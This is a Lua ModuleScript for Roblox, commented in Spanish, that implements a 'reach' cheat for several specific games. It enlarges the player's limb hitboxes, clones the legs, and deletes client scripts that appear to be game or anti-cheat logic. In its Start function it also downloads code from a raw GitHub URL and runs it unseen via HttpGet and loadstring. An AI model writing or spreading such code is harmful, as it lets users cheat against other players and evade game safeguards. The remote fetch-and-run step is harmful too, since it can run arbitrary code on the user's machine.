-- ReachModuleAll (ModuleScript)
-- Coloca este ModuleScript en ReplicatedStorage con el nombre "ReachModuleAll"

local module = {}

local Debris = game:GetService("Debris")

-- =============================
-- DEFAULTS (puedes sobrescribirlas desde fuera)
-- =============================
module.reach = true
module.reachopacity = 1
module.legreach = true
module.legreachmul = 4
module.armreach = false
module.armreachmul = 40
module.trollclear = false

-- =============================
-- CONFIGS POR JUEGO (solo comportamiento interno: nombres de partes y qué borrar)
-- =============================
local GAME_CONFIGS = {
	[110872816350806] = { -- CRL
		name = "CRL",
		useRA = "Right Arm",
		useLA = "Left Arm",
		useRL = "RL",
		useLL = "LL",
		useRightLeg = "Right Leg",
		useLeftLeg = "Left Leg",
		destroy = {"ClientRemotesFire", "LocalScript"}, -- solo estos
		externalScriptUrl = "https://raw.githubusercontent.com/entryxy/T23954u8/refs/heads/main/x10.lua",
	},

	[5798235963] = { -- ROFI
		name = "ROFI",
		useRA = "Right Arm",
		useLA = "Left Arm",
		useRL = "RL",
		useLL = "LL",
		useRightLeg = "Right Leg",
		useLeftLeg = "Left Leg",
		destroy = {"ClientPhysics"}, -- tal como pediste
		externalScriptUrl = "https://raw.githubusercontent.com/entryxy/T23954u8/refs/heads/main/x10.lua",
	},

	[107964643251232] = { -- CBM
		name = "CBM",
		useRA = "RA",
		useLA = "LA",
		useRL = "RL",
		useLL = "LL",
		useRightLeg = "Right Leg",
		useLeftLeg = "Left Leg",
		destroy = {},
		externalScriptUrl = "https://raw.githubusercontent.com/entryxy/T23954u8/refs/heads/main/x10.lua",
	},

	[75556274834790] = { -- LPFI (usa mismo que CBM)
		name = "LPFI",
		useRA = "RA",
		useLA = "LA",
		useRL = "RL",
		useLL = "LL",
		useRightLeg = "Right Leg",
		useLeftLeg = "Left Leg",
		destroy = {},
		externalScriptUrl = "https://raw.githubusercontent.com/entryxy/T23954u8/refs/heads/main/x10.lua",
	},

	[90167289387828] = { -- FORES
		name = "FORES",
		useRA = "Right Arm",
		useLA = "Left Arm",
		useRL = "RL",
		useLL = "LL",
		useRightLeg = "Right Leg",
		useLeftLeg = "Left Leg",
		destroy = {},
		externalScriptUrl = "https://raw.githubusercontent.com/entryxy/T23954u8/refs/heads/main/x10.lua",
	},
}

-- =============================
-- HELPERS
-- =============================
local function getCharacter(player, timeout)
	timeout = timeout or 5
	local t0 = tick()
	while tick() - t0 < timeout do
		if player.Character and player.Character.Parent then return player.Character end
		wait(0.05)
	end
	return player.Character
end

-- clonación EXACTA de tus piernas (mismo orden y waits)
local function cloneAndWeldLegs(character)
	if not character then return end

	local rleg = character:FindFirstChild("Right Leg")
	if rleg then
		local rlegCopy = rleg:Clone()
		rlegCopy.Parent = rleg.Parent
		rlegCopy.Anchored = true

		local weldConstraint = Instance.new("WeldConstraint")
		weldConstraint.Part0 = rlegCopy
		weldConstraint.Part1 = rleg
		weldConstraint.Parent = rlegCopy

		wait(0.1)
		rlegCopy.Anchored = false
	end

	local lleg = character:FindFirstChild("Left Leg")
	if lleg then
		local llegCopy = lleg:Clone()
		llegCopy.Parent = lleg.Parent
		llegCopy.Anchored = true

		local weldConstraint = Instance.new("WeldConstraint")
		weldConstraint.Part0 = llegCopy
		weldConstraint.Part1 = lleg
		weldConstraint.Parent = llegCopy

		wait(0.1)
		llegCopy.Anchored = false
	end
end

-- destruir solo los hijos que estén en la lista (no borra todo)
local function destroyCharacterChildren(character, list)
	if not character or not list then return end
	for _, name in ipairs(list) do
		local c = character:FindFirstChild(name)
		if c then
			pcall(function() c:Destroy() end)
		end
	end
end

-- intenta cargar un script remoto (no fatal)
local function tryLoadExternal(url)
	if not url or url == "" then return end
	pcall(function()
		local body = game:HttpGet(url)
		if body and body ~= "" then
			local f = loadstring(body)
			if f then pcall(f) end
		end
	end)
end

-- aplica reach usando las variables que el usuario ponga sobre el módulo (self.*)
local function applyReach(self, character, cfg)
	if not character or not cfg then return end

	-- lee las variables desde el módulo (para que sean universales)
	local reach = self.reach
	local reachopacity = self.reachopacity
	local legreach = self.legreach
	local armreach = self.armreach
	local legreachmul = self.legreachmul
	local armreachmul = self.armreachmul

	local function setIfExists(name, sizeVec, trans, massless)
		if not name then return end
		local p = character:FindFirstChild(name)
		if p and p:IsA("BasePart") then
			p.Size = sizeVec
			p.Transparency = trans
			p.Massless = massless
		end
	end

	if reach then
		if armreach then
			setIfExists(cfg.useRA, Vector3.new(armreachmul, armreachmul, armreachmul), reachopacity, true)
			setIfExists(cfg.useLA, Vector3.new(armreachmul, armreachmul, armreachmul), reachopacity, true)
		end

		if legreach then
			-- prioriza RL/LL (nombres cortos); cae a Right/Left Leg si no existen
			if character:FindFirstChild(cfg.useRL) or character:FindFirstChild(cfg.useLL) then
				setIfExists(cfg.useRL, Vector3.new(legreachmul, 2, legreachmul), reachopacity, true)
				setIfExists(cfg.useLL, Vector3.new(legreachmul, 2, legreachmul), reachopacity, true)
			else
				setIfExists(cfg.useRightLeg, Vector3.new(legreachmul, 2, legreachmul), reachopacity, true)
				setIfExists(cfg.useLeftLeg, Vector3.new(legreachmul, 2, legreachmul), reachopacity, true)
			end
		end
	else
		-- restaurar a valores por defecto (silencioso si no existen)
		setIfExists(cfg.useRA, Vector3.new(1,2,1), 0, true)
		setIfExists(cfg.useLA, Vector3.new(1,2,1), 0, true)
		setIfExists(cfg.useRL, Vector3.new(1,2,1), 0, true)
		setIfExists(cfg.useLL, Vector3.new(1,2,1), 0, true)
		setIfExists(cfg.useRightLeg, Vector3.new(1,2,1), 0, true)
		setIfExists(cfg.useLeftLeg, Vector3.new(1,2,1), 0, true)
	end
end

-- =============================
-- PUBLIC: Start(player)
-- =============================
function module:Start(player)
	if not player then error("ReachModuleAll: Start requires player") end

	local cfg = GAME_CONFIGS[game.PlaceId]
	if not cfg then
		warn("ReachModuleAll: este juego NO está en la lista de autorizados (PlaceId = "..tostring(game.PlaceId).."). No se ejecutará el script.")
		return
	end

	local character = getCharacter(player, 6)
	if not character then
		warn("ReachModuleAll: character no encontrado para "..tostring(player.Name))
		return
	end

	-- CLONAR PIERNAS (idéntico al original)
	cloneAndWeldLegs(character)

	-- destruir solo lo necesario (según config)
	if cfg.destroy and #cfg.destroy > 0 then
		destroyCharacterChildren(character, cfg.destroy)
	end

	-- cargar script externo si cfg tiene URL (no obligatorio)
	if cfg.externalScriptUrl and cfg.externalScriptUrl ~= "" then
		tryLoadExternal(cfg.externalScriptUrl)
	end

	-- aplicar reach usando las variables UNIVERSALES que el usuario setea en el módulo
	applyReach(self, character, cfg)

	-- si querés añadimos aquí comportamiento adicional por juego (trollclear, herramientas, etc.)
end

return module
